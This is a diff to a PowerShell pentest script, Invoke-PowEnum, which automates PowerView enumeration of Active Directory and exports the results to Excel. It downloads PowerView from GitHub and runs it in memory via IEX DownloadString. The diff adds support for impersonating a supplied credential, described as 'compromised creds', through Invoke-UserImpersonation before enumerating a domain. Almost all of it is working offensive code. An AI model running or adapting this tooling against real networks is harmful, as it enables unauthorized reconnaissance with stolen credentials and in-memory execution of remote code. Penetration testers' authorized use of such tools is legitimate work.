@@ -13,11 +13,9 @@ function Invoke-PowEnum
 		then combines the exported .csv's into a tabbed spreadsheet.
 		
 	.NOTES 
-		Requires Excel to be installed on your system.	
-		I've been on a lot of internal pentests	and found that I'm often enumerating environments 
-		using common PowerView commands then putting them into spreadsheets to analyze using filters 
-		and VLookup. Instead of doing this manually, this script will automate that process so you can 
-		dig through the massive amount of data available.
+		Requires Excel to be installed on your system. 
+		Requires PowerView for most of the functionality.
+		I've been on a lot of internal pentests	and found that I'm often enumerating environments with compromised creds using common PowerView commands then putting them into spreadsheets to analyze using filters and VLookup. Instead of doing this manually, this script will automate that process. 
 
 	.LINK 
 		PowerSploit PowerView: https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1
@@ -58,8 +56,13 @@ function Invoke-PowEnum
 		
 		PS C:\> Invoke-PowEnum -Mode Special
 		
-		Perform enumeration of user accounts with specific attributes:
-
+		Perform enumeration of user accounts with specific attributes.
+	
+	.EXAMPLE	
+		
+		PS C:\> Invoke-PowEnum -Credential (Get-Credential) -Mode Special
+		
+		Perform enumeration of user accounts with specific attributes using an alternate credential.
 #>
 
 [CmdletBinding(DefaultParameterSetName="Domain")]
@@ -75,7 +78,12 @@ Param(
 
 	[Parameter(Position = 2)]
     [String]
-    $url = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1"
+    $url = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1",
+	
+	[Parameter(ParameterSetName = 'Credential')]
+    [Management.Automation.PSCredential]
+    [Management.Automation.CredentialAttribute()]
+    $Credential
 )
 	
 	
@@ -93,10 +101,27 @@ try {
 	Write-Host "$url | " -NoNewLine
 	IEX $webclient.DownloadString($url)
 	Write-Host "Success" -ForegroundColor Green
-}catch {Write-Host "Error" -ForegroundColor Red}
+}catch {Write-Host "Error" -ForegroundColor Red; Return}
 	
-#Grab Local Domain Using PowerView Function If None Provided
-if (!$domain) {$domain = (Get-Domain).Name}
+#Uses PowerView to create a new "runas /netonly" type logon and impersonate the token.
+if ($Credential -ne $null){
+	try{
+		$NetworkCredential = $Credential.GetNetworkCredential()
+        $Domain = $NetworkCredential.Domain
+        $UserName = $NetworkCredential.UserName
+	Write-Host "Impersonate user:$Domain\$Username | " -NoNewLine
+	Invoke-UserImpersonation -Credential $Credential -WarningAction silentlyContinue | Out-Null
+	Write-Host "Success" -ForegroundColor Green 
+	}catch{Write-Host "Error" -ForegroundColor; Return}
+	
+}	
+	
+#Grab Local Domain: Use passed credential ojbject of using PowerView Function If None Provided
+if (!$domain -and $credential -ne $null) {
+$NetworkCredential = $Credential.GetNetworkCredential()
+$Domain = $NetworkCredential.Domain
+}
+elseif (!$domain -and !$Credential) {$domain = (Get-Domain).Name}
 Write-Host "Enumeration Domain: $domain" -ForegroundColor Cyan
 
 #Supprese Errors and Warnings
@@ -419,7 +444,7 @@ function PowEnum-ExcelFile {
 		#Exit if enumeration resulting in nothing
 		if($script:ExportSheetFileArray.Count -eq 0){Write-Host "Exiting: No Data Identified" -ForegroundColor Red; Return}
 		$path = (Get-Item -Path ".\" -Verbose).FullName
-		$XLOutput =  $path + "\" + $env:USERNAME + "_$SpreadsheetName" + "_" + $(get-random) + ".xlsx"
+		$XLOutput =  $path + "\" + $Domain + "_$SpreadsheetName" + "_" + $(get-random) + ".xlsx"
 
 		# Create Excel object (visible), workbook and worksheet
 		$Excel = New-Object -ComObject excel.application 
